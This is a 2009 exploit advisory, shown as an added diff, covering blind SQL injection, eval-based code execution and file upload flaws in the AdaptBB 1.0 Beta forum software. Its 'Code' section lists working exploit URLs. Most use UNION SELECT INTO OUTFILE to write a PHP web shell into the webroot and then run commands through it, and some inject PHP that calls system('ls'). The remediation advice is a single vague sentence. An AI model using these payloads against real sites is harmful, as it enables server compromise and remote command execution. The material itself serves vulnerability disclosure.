@@ -1,0 +1,120 @@
+*******   Salvatore "drosophila" Fresta   *******
+
+[+] Application: AdaptBB
+[+] Version: 1.0 Beta
+[+] Website: http://sourceforge.net/projects/adaptbb/
+
+[+] Bugs: [A] Multiple Blind SQL Injection
+          [B] Multiple Dynamic Code Execution
+          [C] Arbitrary File Upload
+
+[+] Exploitation: Remote
+[+] Date: 09 Apr 2009
+
+[+] Discovered by: Salvatore "drosophila" Fresta
+[+] Author: Salvatore "drosophila" Fresta
+[+] Contact: e-mail: drosophilaxxx@gmail.com
+
+
+*************************************************
+
+[+] Menu
+
+1) Bugs
+2) Code
+3) Fix
+
+
+*************************************************
+
+[+] Bugs
+
+
+- [A] Multiple Blind SQL Injection
+
+[-] Risk: medium
+[-] Requisites: magic_quotes_gpc = off
+[-] File affected: almost all of the files are 
+vulnerable
+
+This bug allows a guest to execute arbitrary SQL
+queries.
+
+
+- [B] Multiple Dynamic Code Execution
+
+[-] Risk: hight
+[-] File affected: almost all of the files are 
+vulnerable
+
+This bug allows a guest to execute arbitrary php
+code.
+
+...
+
+if ($_GET['box']) {
+$folder = $_GET['box'];
+}
+
+...
+
+$ddata[] = ucwords($folder);
+
+...
+
+eval (" ?> ".str_replace($cdata, $ddata, stripslashes(template($view."_header")))." <?php ");
+
+...
+
+
+- [C] Arbitrary File Upload
+
+[-] Risk: hight
+[-] File affected: attach.php
+
+This bug allows a registered user to upload 
+arbitrary files and to execute them from 
+inc/attachments directory. This is possible 
+because there are no controls on file extension 
+on the server side but only on the client side. 
+
+
+*************************************************
+
+[+] Code
+
+
+- [A] Multiple Blind SQL Injection
+
+http://site/path/inc/attach.php?id=-1' UNION ALL SELECT '<?php system($_GET[cmd])%3b ?>',2,3,4,5,6,7,8 INTO OUTFILE '/var/www/htdocs/path/rce.php'%23
+
+http://site/path/index.php?do=profile&user=blabla&box=-1' UNION ALL SELECT '<?php system($_GET[cmd])%3b ?>',2,3,4,5,6,7,8 INTO OUTFILE '/var/www/htdocs/path/rce.php'%23
+
+http://site/path/index.php?do=messages&user=blabla&box=-1' UNION ALL SELECT '<?php system($_GET[cmd])%3b ?>',2,3,4,5,6,7,8 INTO OUTFILE '/var/www/htdocs/path/rce.php'%23
+
+http://site/path/index.php?do=edit_post&id=-1' UNION ALL SELECT '<?php system($_GET[cmd])%3b ?>',2,3,4,5,6,7,8,9 INTO OUTFILE '/var/www/htdocs/path/rce.php'%23
+
+To execute commands:
+
+http://site/path/rce.php?cmd=uname -a
+
+
+- [B] Multiple Dynamic Code Execution
+
+http://www.site.com/path/index.php?do=profile&user=blabla&box=<?php echo "<pre>"; system('ls'); echo "</pre>"?>
+
+http://www.site.com/path/index.php?do=messages&user=blabla&box=<?php echo "<pre>"; system('ls'); echo "</pre>"?>
+
+
+*************************************************
+
+[+] Fix
+
+To fix them you must check the input properly.
+However is not recommended to store your real 
+username and password in the cookies.
+
+
+*************************************************
+
+# milw0rm.com [2009-04-09]
